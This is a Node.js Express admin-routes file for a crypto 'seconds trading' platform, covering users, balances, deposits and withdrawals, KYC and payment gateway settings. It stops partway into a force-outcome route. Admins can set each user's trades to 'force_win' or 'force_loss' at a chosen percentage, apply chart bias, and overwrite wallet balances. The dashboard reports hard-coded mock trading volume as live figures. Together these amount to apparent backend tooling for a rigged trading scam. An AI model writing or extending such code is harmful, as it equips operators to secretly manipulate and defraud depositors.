/**
 * =============================================================================
 *  NEXUS BACKEND — routes/admin.js
 * =============================================================================
 *  Admin-only endpoints. All routes gated by requireAuth + requireAdmin.
 *
 *    GET    /api/admin/overview
 *    GET    /api/admin/invite-codes
 *    POST   /api/admin/invite-codes
 *    DELETE /api/admin/invite-codes/:id
 *    GET    /api/admin/users
 *    PUT    /api/admin/users/:id/balance
 *    PUT    /api/admin/users/:id/ban
 *    GET    /api/admin/transactions             (?status=pending)
 *    PUT    /api/admin/transactions/:id/verify  { action: approve|reject, note? }
 *    PATCH  /api/admin/transactions/:id/verify  { action: approve|reject, note? }
 *    GET    /api/admin/kyc-requests             (?status=pending|approved|rejected)
 *    PATCH  /api/admin/users/:id/kyc            { action: approve|reject, note? }
 * =============================================================================
 */

import { Router } from "express";
import { body, validationResult } from "express-validator";
import mongoose from "mongoose";
import crypto from "node:crypto";
import bcrypt from "bcryptjs";

import User from "../models/User.js";
import InviteCode from "../models/InviteCode.js";
import Transaction from "../models/Transaction.js";
import Message from "../models/Message.js";
import GatewaySetting from "../models/GatewaySetting.js";
import PlatformConfig from "../models/PlatformConfig.js";
import SecondsTrade from "../models/SecondsTrade.js";
import { requireAuth } from "../middleware/auth.js";
import { requireAdmin, requireSuperAdmin } from "../middleware/admin.js";
import {
  tenantDocFilter,
  tenantUserFilter,
  assertTenantUser,
  assertTenantDoc,
  isUnscoped,
} from "../middleware/tenant.js";
import { ROLES } from "../lib/roles.js";
import {
  signedBiasForOutcome,
  outcomeFromGraphDirection,
  signedBiasForGraph,
} from "../lib/tradeBias.js";
import {
  emitChatMessage,
  emitDepositStatus,
  emitWalletUpdate,
} from "../socket.js";

const router = Router();
router.use(requireAuth, requireAdmin);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

const sendValidationError = (res, errors) =>
  res.status(422).json({
    success: false,
    error: "ValidationError",
    message: "One or more fields are invalid.",
    details: errors.array().map((e) => ({
      field: e.path || e.param,
      message: e.msg,
    })),
  });

const requireDatabase = (_req, res, next) => {
  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      error: "ServiceUnavailable",
      message: "Database is offline. Admin actions unavailable.",
    });
  }
  return next();
};

const randomCode = (len = 8) =>
  crypto
    .randomBytes(len)
    .toString("base64")
    .replace(/[^A-Z0-9]/gi, "")
    .toUpperCase()
    .slice(0, len);

// ---------------------------------------------------------------------------
// GET /overview
// ---------------------------------------------------------------------------
router.get(
  "/overview",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const userScope = tenantUserFilter(req);
    const docScope = tenantDocFilter(req);

    const [totalUsers, admins, banned, codes, pendingTx, platform] =
      await Promise.all([
        User.countDocuments({ ...userScope, deletedAt: null, role: "user" }),
        isUnscoped(req)
          ? User.countDocuments({
              role: { $in: [ROLES.ADMIN, ROLES.SUPER_ADMIN] },
              deletedAt: null,
            })
          : Promise.resolve(0),
        User.countDocuments({ ...userScope, banned: true, deletedAt: null }),
        InviteCode.find(docScope).lean(),
        Transaction.countDocuments({ ...docScope, status: "pending" }),
        PlatformConfig.getSingleton(),
      ]);

    const activeCodes = codes.filter((c) => {
      if (!c.active) return false;
      if (c.expiresAt && new Date(c.expiresAt) < new Date()) return false;
      // Single-use policy — any redemption exhausts the code
      if ((c.usedBy?.length || 0) >= 1) return false;
      return true;
    }).length;

    return res.json({
      success: true,
      stats: {
        totalUsers,
        admins,
        bannedUsers: banned,
        totalInviteCodes: codes.length,
        activeInviteCodes: activeCodes,
        pendingTransactions: pendingTx,
        mockVolume24h: 4_286_712.55,
        mockTrades24h: 18_294,
        globalTradingEnabled: platform.globalTradingEnabled !== false,
      },
      globalTradingEnabled: platform.globalTradingEnabled !== false,
      isSuperAdmin: Boolean(req.isSuperAdmin),
    });
  })
);

// ---------------------------------------------------------------------------
// GLOBAL TRADING ACCESS — platform-wide kill switch
// ---------------------------------------------------------------------------
router.put(
  "/trading-access/global",
  requireDatabase,
  [
    body("enabled")
      .isBoolean()
      .withMessage("enabled must be a boolean."),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const platform = await PlatformConfig.getSingleton();
    platform.globalTradingEnabled = Boolean(req.body.enabled);
    platform.updatedBy = req.auth.sub;
    await platform.save();

    return res.json({
      success: true,
      message: platform.globalTradingEnabled
        ? "Global trading enabled for all users."
        : "Global trading disabled — all new trades suspended.",
      globalTradingEnabled: platform.globalTradingEnabled,
    });
  })
);

// Per-user trading allow / block
router.put(
  "/users/:id/trading-access",
  requireDatabase,
  [
    body("allowed")
      .isBoolean()
      .withMessage("allowed must be a boolean."),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }

    const scoped = await assertTenantUser(req, id);
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;

    user.tradingAllowed = Boolean(req.body.allowed);
    await user.save();

    return res.json({
      success: true,
      message: user.tradingAllowed
        ? "User trading access allowed."
        : "User trading access blocked.",
      user: {
        ...user.toObject({ virtuals: true }),
        password: undefined,
        id: user._id.toString(),
        wallet:
          user.wallet instanceof Map
            ? Object.fromEntries(user.wallet)
            : user.wallet,
      },
    });
  })
);

// ---------------------------------------------------------------------------
// INVITE CODES
// ---------------------------------------------------------------------------
router.get(
  "/invite-codes",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const codes = await InviteCode.find(tenantDocFilter(req))
      .populate("createdBy", "username email fullName")
      .sort({ createdAt: -1 });
    return res.json({ success: true, codes });
  })
);

router.post(
  "/invite-codes",
  requireDatabase,
  [
    body("code")
      .optional({ nullable: true, checkFalsy: true })
      .isString()
      .isLength({ min: 4, max: 32 })
      .matches(/^[A-Z0-9-]+$/i)
      .withMessage("Code may only contain letters, numbers, dashes."),
    body("role").optional().isIn(["user", "admin"]),
    body("expiresAt")
      .optional({ nullable: true, checkFalsy: true })
      .isISO8601(),
    body("notes")
      .optional({ nullable: true, checkFalsy: true })
      .isString()
      .isLength({ max: 200 }),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const rawCode = (req.body.code || randomCode(8)).toUpperCase();
    const existing = await InviteCode.findOne({ code: rawCode }).lean();
    if (existing) {
      return res.status(409).json({
        success: false,
        error: "ConflictError",
        message: "That code already exists.",
      });
    }

    // Only SUPER_ADMIN may mint ADMIN-role invite codes
    const codeRole = req.body.role || "user";
    if (codeRole === "admin" && !req.isSuperAdmin) {
      return res.status(403).json({
        success: false,
        error: "ForbiddenError",
        message: "Only Super Admin can create admin invitation codes.",
      });
    }

    // Tenant stamp: sub-admin → self; super-admin may target a specific adminId
    let tenantId = req.auth.sub;
    if (req.isSuperAdmin && req.body.adminId && mongoose.isValidObjectId(req.body.adminId)) {
      tenantId = req.body.adminId;
    } else if (req.isSuperAdmin && codeRole === "admin") {
      // New admin will self-own on redeem; stamp creator for audit
      tenantId = req.auth.sub;
    }

    // Always single-use — one registration per code
    const created = await InviteCode.create({
      code: rawCode,
      role: codeRole,
      maxUses: 1,
      expiresAt: req.body.expiresAt || null,
      notes: req.body.notes || null,
      createdBy: req.auth.sub,
      adminId: tenantId,
    });
    return res.status(201).json({
      success: true,
      message: "Single-use invitation code created.",
      code: created,
    });
  })
);

router.delete(
  "/invite-codes/:id",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid invite code id.",
      });
    }
    const code = await InviteCode.findById(id);
    if (!code || !assertTenantDoc(req, code)) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Invite code not found.",
      });
    }
    if ((code.usedBy?.length || 0) > 0) {
      return res.status(409).json({
        success: false,
        error: "ConflictError",
        message: "Cannot delete a code that has been redeemed.",
      });
    }
    await code.deleteOne();
    return res.json({ success: true, message: "Invite code removed." });
  })
);

// ---------------------------------------------------------------------------
// USERS
// ---------------------------------------------------------------------------
router.get(
  "/users",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const q = (req.query.q || "").toString().trim();
    const scope = tenantUserFilter(req);
    // SUPER_ADMIN keeps soft-deleted users in archive (default includeDeleted=1)
    // Sub-admins never see deleted users
    const includeDeleted =
      isUnscoped(req) && String(req.query.includeDeleted ?? "1") !== "0";
    const base = includeDeleted
      ? { ...scope }
      : { deletedAt: null, ...scope };
    const filter = { ...base };
    // Sub-admins only manage USER accounts in their tenant
    if (!isUnscoped(req)) {
      filter.role = "user";
    }
    if (q) {
      filter.$and = [
        { ...base },
        ...(filter.role ? [{ role: filter.role }] : []),
        {
          $or: [
            { email: { $regex: q, $options: "i" } },
            { username: { $regex: q, $options: "i" } },
            { fullName: { $regex: q, $options: "i" } },
          ],
        },
      ];
      delete filter.deletedAt;
      delete filter.role;
      Object.keys(scope).forEach((k) => delete filter[k]);
    }
    const users = await User.find(filter)
      .populate("adminId", "fullName username email")
      .sort({ createdAt: -1 })
      .limit(800);
    return res.json({
      success: true,
      users,
      isSuperAdmin: Boolean(req.isSuperAdmin),
      includeDeleted,
    });
  })
);

router.put(
  "/users/:id/balance",
  requireDatabase,
  [
    body("symbol").isString().trim().isLength({ min: 2, max: 10 }),
    body("amount").isFloat(),
    body("mode").optional().isIn(["set", "add"]),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }
    const symbol = req.body.symbol.toUpperCase();
    const amount = Number(req.body.amount);
    const mode = req.body.mode || "set";

    const scoped = await assertTenantUser(req, id);
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;
    const current = Number(user.wallet.get(symbol) || 0);
    // High-precision decimals (e.g. 0.09, 10.55) — store exact to 8dp
    const next =
      mode === "add"
        ? Number((current + amount).toFixed(8))
        : Number(Number(amount).toFixed(8));
    user.wallet.set(symbol, next);
    user.markModified("wallet");
    await user.save();

    const wallet =
      user.wallet instanceof Map
        ? Object.fromEntries(user.wallet)
        : { ...(user.wallet || {}) };

    return res.json({
      success: true,
      message: `Balance for ${symbol} updated.`,
      user: {
        ...user.toObject({ virtuals: true }),
        password: undefined,
        wallet,
        id: user._id.toString(),
      },
    });
  })
);

router.put(
  "/users/:id/ban",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }
    const scoped = await assertTenantUser(req, id);
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;
    if (user._id.toString() === req.auth.sub) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "You cannot ban your own account.",
      });
    }
    if (
      (user.role === ROLES.ADMIN || user.role === ROLES.SUPER_ADMIN) &&
      !req.isSuperAdmin
    ) {
      return res.status(403).json({
        success: false,
        error: "ForbiddenError",
        message: "Cannot ban admin accounts from this panel.",
      });
    }
    const nextBanned =
      typeof req.body.banned === "boolean" ? req.body.banned : !user.banned;
    user.banned = nextBanned;
    await user.save();
    return res.json({
      success: true,
      message: nextBanned ? "User banned." : "User set to Active.",
      user,
    });
  })
);

// DELETE /users/:id
//   Admin → soft-delete (hidden from that admin; Super Admin keeps full archive)
//   Super Admin + ?permanent=1 → hard purge (only Super Admin can wipe forever)
router.delete(
  "/users/:id",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }

    const permanent =
      String(req.query.permanent || "") === "1" ||
      req.body?.permanent === true;

    if (permanent && !req.isSuperAdmin) {
      return res.status(403).json({
        success: false,
        error: "ForbiddenError",
        message: "Only Super Admin can permanently purge archived users.",
      });
    }

    const scoped = await assertTenantUser(req, id, {
      allowDeleted: Boolean(permanent && req.isSuperAdmin),
    });
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;
    if (user._id.toString() === req.auth.sub) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "You cannot delete your own account.",
      });
    }
    if (user.role === ROLES.ADMIN || user.role === ROLES.SUPER_ADMIN) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Admin accounts cannot be deleted from this panel.",
      });
    }

    if (permanent) {
      // Super Admin permanent wipe — removes archive + chats + ledger
      await Promise.all([
        Message.deleteMany({ user: user._id }),
        SecondsTrade.deleteMany({ user: user._id }),
        Transaction.deleteMany({ user: user._id }),
      ]);
      await User.findByIdAndDelete(user._id);
      return res.json({
        success: true,
        message: "User permanently purged from Super Admin archive.",
        permanent: true,
        userId: id,
      });
    }

    // Soft-delete — admin directory hides them; Super Admin keeps everything
    if (user.deletedAt) {
      return res.json({
        success: true,
        message: "User already archived for Super Admin.",
        softDeleted: true,
        user,
      });
    }
    user.deletedAt = new Date();
    user.banned = true;
    await user.save();

    return res.json({
      success: true,
      message:
        "User removed from your directory. Super Admin still retains full details, trades, and chat history.",
      softDeleted: true,
      user,
      userId: id,
    });
  })
);

// PUT /users/:id/password — admin resets user password
router.put(
  "/users/:id/password",
  requireDatabase,
  [
    body("newPassword")
      .isString()
      .isLength({ min: 8, max: 128 })
      .withMessage("Password must be at least 8 characters."),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }

    const scoped = await assertTenantUser(req, id);
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = await User.findById(id).select("+password");
    if (!user || user.deletedAt) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "User not found.",
      });
    }

    user.password = await bcrypt.hash(req.body.newPassword, 12);
    await user.save();

    return res.json({
      success: true,
      message: `Password reset for @${user.username}. Share the new password securely.`,
    });
  })
);

// ---------------------------------------------------------------------------
// TRADE CONTROL — Force Win / Force Loss / Normal per-user risk switch
// ---------------------------------------------------------------------------
router.put(
  "/users/:id/trade-control",
  requireDatabase,
  [
    body("state")
      .isIn(["normal", "force_win", "force_loss"])
      .withMessage("state must be normal, force_win or force_loss."),
    body("percentage")
      .isFloat({ min: 0, max: 100 })
      .withMessage("percentage must be between 0 and 100."),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }

    const scoped = await assertTenantUser(req, id);
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;

    user.tradeControlState = req.body.state;
    user.tradeControlPercentage = Number(req.body.percentage);
    await user.save();

    return res.json({
      success: true,
      message:
        req.body.state === "normal"
          ? "Trade control cleared — normal market execution."
          : `Trade control set to ${req.body.state.replace("_", " ")} at ${
              req.body.percentage
            }%.`,
      user,
    });
  })
);

// ---------------------------------------------------------------------------
// TRANSACTIONS
// ---------------------------------------------------------------------------
router.get(
  "/transactions",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const status = req.query.status;
    const kind = req.query.kind;
    const filter = { ...tenantDocFilter(req) };
    if (status) filter.status = status;
    if (kind) filter.kind = kind;

    const transactions = await Transaction.find(filter)
      .populate("user", "username email fullName adminId")
      .sort({ createdAt: -1 })
      .limit(500);
    return res.json({ success: true, transactions });
  })
);

const verifyTransactionValidators = [
  body("action").isIn(["approve", "reject"]),
  body("note")
    .optional({ nullable: true, checkFalsy: true })
    .isString()
    .isLength({ max: 300 }),
];

const walletObject = (user) =>
  user?.wallet instanceof Map
    ? Object.fromEntries(user.wallet)
    : { ...(user?.wallet || {}) };

const verifyTransactionHandler = asyncHandler(async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) return sendValidationError(res, errors);

  const { id } = req.params;
  if (!mongoose.isValidObjectId(id)) {
    return res.status(400).json({
      success: false,
      error: "BadRequestError",
      message: "Invalid transaction id.",
    });
  }

  const tx = await Transaction.findById(id);
  if (!tx || !assertTenantDoc(req, tx)) {
    return res.status(404).json({
      success: false,
      error: "NotFoundError",
      message: "Transaction not found.",
    });
  }
  if (tx.status !== "pending") {
    return res.status(409).json({
      success: false,
      error: "ConflictError",
      message: `Transaction already ${tx.status}.`,
    });
  }

  const action = req.body.action;
  let affectedUser = null;

  if (action === "approve") {
    const user = await User.findById(tx.user);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Target user vanished.",
      });
    }
    const current = Number(user.wallet.get(tx.symbol) || 0);

    if (tx.kind === "deposit") {
      // Credit Trading Wallet (wallet[symbol], typically USDT) immediately
      user.wallet.set(tx.symbol, current + Number(tx.amount));
      user.markModified("wallet");
      await user.save();
      affectedUser = user;
    } else if (tx.kind === "withdrawal") {
      if (!tx.fundsHeld) {
        if (current < tx.amount) {
          return res.status(400).json({
            success: false,
            error: "InsufficientFundsError",
            message: `User has ${current} ${tx.symbol}, needs ${tx.amount}.`,
          });
        }
        user.wallet.set(tx.symbol, current - tx.amount);
        user.markModified("wallet");
        await user.save();
      }
      affectedUser = user;
    }
    tx.status = "approved";
  } else {
    // Decline / REJECTED — do not mutate deposit balances
    if (tx.kind === "withdrawal" && tx.fundsHeld) {
      const user = await User.findById(tx.user);
      if (user) {
        const current = Number(user.wallet.get(tx.symbol) || 0);
        user.wallet.set(tx.symbol, current + Number(tx.amount));
        user.markModified("wallet");
        await user.save();
        tx.fundsHeld = false;
        affectedUser = user;
      }
    } else {
      affectedUser = await User.findById(tx.user);
    }
    tx.status = "rejected";
  }

  tx.reviewedBy = req.auth.sub;
  tx.reviewedAt = new Date();
  tx.reviewerNote = req.body.note || null;
  await tx.save();

  if (!affectedUser) {
    affectedUser = await User.findById(tx.user);
  }

  const wallet = walletObject(affectedUser);
  const userId = String(tx.user);

  if (tx.kind === "deposit" || action === "approve" || tx.fundsHeld === false) {
    emitWalletUpdate(userId, wallet, {
      reason: action === "approve" ? "deposit_approved" : "deposit_rejected",
      transactionId: String(tx._id),
      status: tx.status,
      amount: tx.amount,
      symbol: tx.symbol,
    });
  }

  emitDepositStatus(userId, {
    transactionId: String(tx._id),
    status: tx.status === "rejected" ? "REJECTED" : tx.status,
    action,
    amount: tx.amount,
    symbol: tx.symbol,
    wallet,
  });

  // In-thread system notice for Support Chat
  if (tx.kind === "deposit") {
    const noticeBody =
      action === "approve"
        ? `Deposit approved · $${Number(tx.amount).toFixed(2)} ${tx.symbol} credited to Trading Wallet.`
        : `Deposit declined · $${Number(tx.amount).toFixed(2)} ${tx.symbol} marked REJECTED. No balance change applied.`;
    const notice = await Message.create({
      user: tx.user,
      from: "admin",
      body: noticeBody,
      messageType: "system",
      adminAuthor: req.auth.sub,
      readByAdmin: true,
      readByUser: false,
      meta: {
        kind: "deposit_review",
        transactionId: String(tx._id),
        status: tx.status,
        amount: tx.amount,
        symbol: tx.symbol,
      },
    });
    emitChatMessage(userId, notice);
  }

  const populated = await Transaction.findById(tx._id).populate(
    "user",
    "username email fullName trc20Address"
  );

  return res.json({
    success: true,
    message: `Transaction ${action === "approve" ? "approved" : "declined"}.`,
    transaction: populated,
    wallet,
    userId,
  });
});

router.put(
  "/transactions/:id/verify",
  requireDatabase,
  verifyTransactionValidators,
  verifyTransactionHandler
);

router.patch(
  "/transactions/:id/verify",
  requireDatabase,
  verifyTransactionValidators,
  verifyTransactionHandler
);

// ---------------------------------------------------------------------------
// KYC — list pending KYC requests
// ---------------------------------------------------------------------------
router.get(
  "/kyc-requests",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const status = (req.query.status || "pending").toString();
    const filter = { "kyc.status": status, deletedAt: null, ...tenantUserFilter(req) };
    if (!isUnscoped(req)) filter.role = "user";
    const users = await User.find(filter).sort({ "kyc.submittedAt": -1 }).limit(200);
    return res.json({ success: true, users });
  })
);

// ---------------------------------------------------------------------------
// PATCH /users/:id/kyc — approve or reject a KYC submission
// ---------------------------------------------------------------------------
router.patch(
  "/users/:id/kyc",
  requireDatabase,
  [
    body("action").isIn(["approve", "reject"]),
    body("note")
      .optional({ nullable: true, checkFalsy: true })
      .isString()
      .isLength({ max: 300 }),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const { id } = req.params;
    if (!mongoose.isValidObjectId(id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }

    const scoped = await assertTenantUser(req, id);
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;

    if (!user.kyc || user.kyc.status !== "pending") {
      return res.status(409).json({
        success: false,
        error: "ConflictError",
        message: `No pending KYC to review (current: ${user.kyc?.status || "unverified"}).`,
      });
    }

    const approved = req.body.action === "approve";
    user.kyc.status = approved ? "approved" : "rejected";
    user.kyc.reviewedAt = new Date();
    user.kyc.reviewedBy = req.auth.sub;
    user.kyc.reviewerNote = req.body.note || null;
    user.markModified("kyc");
    await user.save();

    return res.json({
      success: true,
      message: approved
        ? "Verification approved. User is now Verified."
        : "Verification declined.",
      user,
    });
  })
);

// ---------------------------------------------------------------------------
// GATEWAY SETTINGS
// ---------------------------------------------------------------------------
// GET /gateway-settings — admin view of the current platform config
router.get(
  "/gateway-settings",
  requireDatabase,
  asyncHandler(async (_req, res) => {
    const doc = await GatewaySetting.getSingleton();
    return res.json({ success: true, settings: doc });
  })
);

// POST /gateway-settings — save flexible rails + uploads (+ legacy fields)
router.post(
  "/gateway-settings",
  requireDatabase,
  [
    body("instructions")
      .optional({ nullable: true, checkFalsy: true })
      .isString()
      .isLength({ max: 2000 }),
    body("rails").optional().isArray({ max: 40 }),
    body("rails.*.id").optional().isString().isLength({ max: 64 }),
    body("rails.*.label").optional().isString().isLength({ max: 80 }),
    body("rails.*.value").optional({ nullable: true }).isString().isLength({ max: 500 }),
    body("uploads").optional().isArray({ max: 8 }),
    body("uploads.*.id").optional().isString().isLength({ max: 64 }),
    body("uploads.*.fileName").optional().isString().isLength({ max: 180 }),
    body("uploads.*.mimeType").optional().isString().isLength({ max: 120 }),
    body("uploads.*.size").optional().isInt({ min: 0, max: 3_000_000 }),
    body("uploads.*.dataUrl").optional().isString().isLength({ max: 2_800_000 }),
    // Legacy flat fields still accepted
    body("bankName").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 120 }),
    body("accountTitle").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 120 }),
    body("accountNumber").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 60 }),
    body("iban").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 40 }),
    body("easyPaisaNumber").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 30 }),
    body("jazzCashNumber").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 30 }),
    body("usdtTrc20Address").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 80 }),
    body("usdtErc20Address").optional({ nullable: true, checkFalsy: true }).isString().isLength({ max: 80 }),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const doc = await GatewaySetting.getSingleton();

    if (Array.isArray(req.body.rails)) {
      doc.rails = req.body.rails
        .map((r, i) => ({
          id: String(r?.id || `rail_${Date.now()}_${i}`).slice(0, 64),
          label: String(r?.label || "Field").trim().slice(0, 80) || "Field",
          value: String(r?.value ?? "").trim().slice(0, 500),
        }))
        .slice(0, 40);
      GatewaySetting.syncLegacyFromRails(doc);
    } else {
      const fields = [
        "bankName",
        "accountTitle",
        "accountNumber",
        "iban",
        "easyPaisaNumber",
        "jazzCashNumber",
        "usdtTrc20Address",
        "usdtErc20Address",
      ];
      for (const f of fields) {
        if (Object.prototype.hasOwnProperty.call(req.body, f)) {
          const v = req.body[f];
          doc[f] = v === "" ? null : v;
        }
      }
    }

    if (Array.isArray(req.body.uploads)) {
      const allowed = /^(image\/(png|jpeg|jpg|webp|gif)|application\/pdf|text\/plain)$/i;
      doc.uploads = req.body.uploads
        .filter((u) => u && typeof u.dataUrl === "string" && u.dataUrl.startsWith("data:"))
        .filter((u) => allowed.test(String(u.mimeType || "")))
        .map((u, i) => ({
          id: String(u.id || `up_${Date.now()}_${i}`).slice(0, 64),
          fileName: String(u.fileName || "file").slice(0, 180),
          mimeType: String(u.mimeType || "application/octet-stream").slice(0, 120),
          size: Math.min(Number(u.size) || 0, 2_500_000),
          dataUrl: String(u.dataUrl).slice(0, 2_800_000),
        }))
        .slice(0, 8);
    }

    if (Object.prototype.hasOwnProperty.call(req.body, "instructions")) {
      const v = req.body.instructions;
      doc.instructions = v === "" || v == null ? null : String(v).slice(0, 2000);
    }

    doc.updatedBy = req.auth.sub;
    await doc.save();

    return res.json({
      success: true,
      message: "Gateway settings saved.",
      settings: doc,
    });
  })
);

// ===========================================================================
// Seconds Trading — Admin Control Room
// ===========================================================================

const serializeAdminTrade = (t, userDoc) => {
  const doc = typeof t.toObject === "function" ? t.toObject() : { ...t };
  const now = Date.now();
  const expiresAt = new Date(doc.expiresAt).getTime();
  const remainingSec = Math.max(0, Math.ceil((expiresAt - now) / 1000));
  return {
    ...doc,
    remainingSec,
    user: userDoc
      ? {
          id: userDoc._id,
          fullName: userDoc.fullName,
          username: userDoc.username,
          email: userDoc.email,
          tradeControlState: userDoc.tradeControlState,
          tradeControlPercentage: userDoc.tradeControlPercentage,
        }
      : doc.user,
  };
};

// GET /seconds-trades/active — live open trades for admin alerts
router.get(
  "/seconds-trades/active",
  requireDatabase,
  asyncHandler(async (req, res) => {
    const trades = await SecondsTrade.find({
      status: "open",
      ...tenantDocFilter(req),
    })
      .sort({ openedAt: -1 })
      .limit(200)
      .populate(
        "user",
        "fullName username email tradeControlState tradeControlPercentage adminId"
      );

    res.json({
      success: true,
      trades: trades.map((t) =>
        serializeAdminTrade(t, t.user && typeof t.user === "object" ? t.user : null)
      ),
      serverTime: new Date().toISOString(),
    });
  })
);

// GET /users/:id/control-room — dedicated per-user management view
router.get(
  "/users/:id/control-room",
  requireDatabase,
  asyncHandler(async (req, res) => {
    if (!mongoose.isValidObjectId(req.params.id)) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: "Invalid user id.",
      });
    }

    const scoped = await assertTenantUser(req, req.params.id, {
      allowDeleted: Boolean(req.isSuperAdmin),
    });
    if (scoped.status) {
      return res.status(scoped.status).json({
        success: false,
        error: scoped.status === 404 ? "NotFoundError" : "BadRequestError",
        message: scoped.message,
      });
    }
    const user = scoped.user;

    const [openTrades, recentTrades, recentTx, pendingTx] = await Promise.all([
      SecondsTrade.find({ user: user._id, status: "open" }).sort({
        openedAt: -1,
      }),
      SecondsTrade.find({
        user: user._id,
        status: { $in: ["won", "lost"] },
      })
        .sort({ settledAt: -1 })
        .limit(30),
      Transaction.find({ user: user._id }).sort({ createdAt: -1 }).limit(40),
      Transaction.find({
        user: user._id,
        status: "pending",
        kind: { $in: ["deposit", "withdrawal"] },
      }).sort({ createdAt: -1 }),
    ]);

    const wallet =
      user.wallet instanceof Map
        ? Object.fromEntries(user.wallet)
        : { ...(user.wallet || {}) };
    const chartBias =
      user.chartBias instanceof Map
        ? Object.fromEntries(user.chartBias)
        : { ...(user.chartBias || {}) };

    res.json({
      success: true,
      user: {
        id: user._id,
        fullName: user.fullName,
        username: user.username,
        email: user.email,
        phone: user.phone,
        trc20Address: user.trc20Address || null,
        profileCompletedAt: user.profileCompletedAt || null,
        role: user.role,
        adminId: user.adminId || null,
        banned: user.banned,
        tradingAllowed: user.tradingAllowed !== false,
        tradeControlState: user.tradeControlState,
        tradeControlPercentage: user.tradeControlPercentage,
        avatar: user.avatar || null,
        wallet,
        chartBias,
        kyc: user.kyc,
        createdAt: user.createdAt,
      },
      openTrades: openTrades.map((t) => serializeAdminTrade(t, user)),
      recentTrades: recentTrades.map((t) => serializeAdminTrade(t, user)),
      transactions: recentTx,
      pendingDeposits: pendingTx.filter((t) => t.kind === "deposit"),
      pendingWithdrawals: pendingTx.filter((t) => t.kind === "withdrawal"),
      serverTime: new Date().toISOString(),
    });
  })
);

// PUT /seconds-trades/:id/force-outcome — stamp WIN/LOSS + Manual Balance Add
// Trade always runs full duration; settlement happens at timer = 0 only.
router.put(
